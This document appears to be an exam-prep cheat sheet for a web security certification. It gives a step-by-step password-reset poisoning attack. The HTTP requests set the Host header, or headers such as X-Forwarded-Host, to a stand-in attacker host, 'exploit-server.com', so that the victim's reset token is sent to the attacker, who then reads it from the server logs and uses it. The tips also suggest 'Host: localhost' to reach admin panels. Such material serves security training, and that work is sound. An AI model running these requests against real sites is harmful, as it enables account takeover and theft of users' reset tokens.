## 🎯 Target Location

**Primary Target:** Password Reset Functionality (`Forgot password?`)

## 🔥 Attack Flow

### Step 1: Identify Password Reset
Look for "Forgot password?" functionality

### Step 2: Intercept Reset Request
```http
POST /forgot-password HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

### Step 3: Poison Host Header
```http
POST /forgot-password HTTP/1.1
Host: exploit-server.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

### Step 4: Check Exploit Server Logs
The victim will receive an email with a link containing the token.

### Step 5: Use Token
```http
GET /forgot-password?token=abc123xyz HTTP/1.1
Host: vulnerable-site.com
```

## 🛡️ Alternative Headers

If `Host` header doesn't work, try these:

```http
X-Forwarded-Host: exploit-server.com
X-Host: exploit-server.com
X-Forwarded-Server: exploit-server.com
```

### All Headers

```http
Host: exploit-server.com
X-Host: exploit-server.com
X-Forwarded-Host: exploit-server.com
X-Forwarded-Server: exploit-server.com
X-Forwarded-From: exploit-server.com
X-Forwarded-For: exploit-server.com
X-Forwarded-By: exploit-server.com
Forwarded: for=exploit-server.com;proto=http;host=exploit-server.com
```


## 🎓 Exam Tips

1. **Always test password reset first** - Most common location
2. **Try all header variations** - `X-Forwarded-Host`, `X-Host`, etc.
3. **Check exploit server logs** - Tokens will appear there
4. **Test for localhost bypass** - Try `Host: localhost` for admin panels
